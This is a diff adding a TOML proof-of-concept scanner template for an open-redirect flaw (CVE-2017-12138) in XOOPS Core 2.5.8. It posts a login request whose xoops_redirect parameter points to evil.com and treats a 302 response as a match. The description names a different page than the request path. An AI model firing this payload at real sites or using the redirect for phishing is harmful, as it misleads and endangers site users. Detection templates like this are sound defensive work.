@@ -1,0 +1,31 @@
+[info]
+author = "AVE"
+description = "检测 XOOPS Core 2.5.8 中 /modules/profile/index.php 页面的 URL 重定向绕过漏洞。攻击者可通过构造特制的 xoops_redirect 参数绕过过滤机制，将用户重定向至恶意外部站点，可用于钓鱼攻击。需要先登录系统。"
+id = "POC-AVE-2017-0028"
+name = "XOOPS Core 2.5.8 Open Redirect PoC"
+severity = "medium"
+tags = ["ave-2017-0028"]
+vuln_id = [
+    "CVE-2017-12138",
+    "AVE-2017-0028",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/user.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "xoops_redirect=https://evil.com&op=login"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+status = [302]
+type = "status"
